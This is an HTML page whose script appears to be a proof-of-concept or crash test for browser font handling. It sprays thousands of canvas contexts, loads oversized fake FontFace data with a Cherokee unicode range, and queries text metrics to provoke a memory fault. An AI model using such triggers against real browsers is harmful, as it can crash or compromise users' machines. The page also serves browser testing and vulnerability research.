<!DOCTYPE html>
<script>
const contexts = [];
for (let i = 0; i < 4000; i++) {
    const c = document.createElement('canvas');
    c.width = 1;
    c.height = 1;
    const ctx = c.getContext('2d');
    ctx.font = '10px "f' + i + '"';
    contexts.push(c, ctx);
}

const payload = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
const keep = [];

for (let i = 0; i < 4; i++) {
    const f1 = new FontFace('mDonor' + i, payload);
    const f2 = new FontFace('mTarget' + i, payload, { unicodeRange: 'U+13A0-13FF' });
    document.fonts.add(f1);
    document.fonts.add(f2);

    const c = document.createElement('canvas');
    c.width = 64;
    c.height = 64;
    const ctx = c.getContext('2d');
    ctx.font = '10px mDonor' + i + ', mTarget' + i;
    keep.push(f1, f2, c, ctx);

    const tm = ctx.measureText('\u13A0\u13A2\u13A4');
    tm.fontBoundingBoxAscent;
    tm.emHeightAscent;
}
</script>
